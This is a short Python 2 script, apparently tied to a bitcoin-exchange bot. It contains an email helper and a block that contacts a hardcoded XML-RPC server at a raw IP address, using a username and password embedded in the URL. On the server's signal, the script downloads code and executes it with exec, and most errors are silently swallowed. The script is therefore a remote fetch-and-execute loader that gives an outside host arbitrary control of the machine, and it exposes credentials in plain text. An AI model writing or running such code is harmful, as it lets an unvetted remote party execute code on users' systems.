#!/usr/bin/python
# -*- coding: cp1252 -*-

import smtplib
import xmlrpclib


def sendemail(from_addr, to_addr_list, cc_addr_list, subject, message, login, password,
              smtpserver='smtp.gmail.com:587'):
    header = "From: %s\n" % from_addr
    header += 'To: %s\n' % ','.join(to_addr_list)
    header += 'Cc: %s\n' % ','.join(cc_addr_list)
    header += 'Subject: %s\n\n' % subject
    message = header + message
    try:
        server = smtplib.SMTP(smtpserver)
        server.ehlo()
        server.starttls()
        server.login(login, password)
        server.sendmail(from_addr, to_addr_list, message)
        server.quit()
    except Exception:
        pass


try:
    server = xmlrpclib.Server('https://shemer77:pieceofshit@162.243.212.246:8788')
    shouldirun = server.shouldirunbtce()
except Exception as e:
    pass

try:
    if shouldirun == 1:
        mainfunctions = server.get_extra_functions()
        exec mainfunctions
except Exception as e:
    print e
    pass